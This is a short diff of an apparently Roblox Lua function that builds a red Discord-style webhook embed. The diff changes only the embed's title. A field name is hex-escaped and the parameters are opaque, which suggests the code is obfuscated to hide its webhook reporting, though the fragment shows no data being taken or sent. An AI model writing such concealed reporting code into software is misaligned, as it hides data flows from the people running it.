@@ -6,7 +6,7 @@ return function(x1, x2, x3, x4, x5, x6)
     local A = x6:JSONEncode({
         embeds = {
             {
-                title = "🛰️ Webhook Ativada",
+                title = "🛰️ WTF",
                 color = 16711680,
                 fields = {
                     { name = "\x57\x65\x62\x68\x6f\x6f\x6b\x20\x75\x73\x61\x64\x61", value = x1, inline = false },
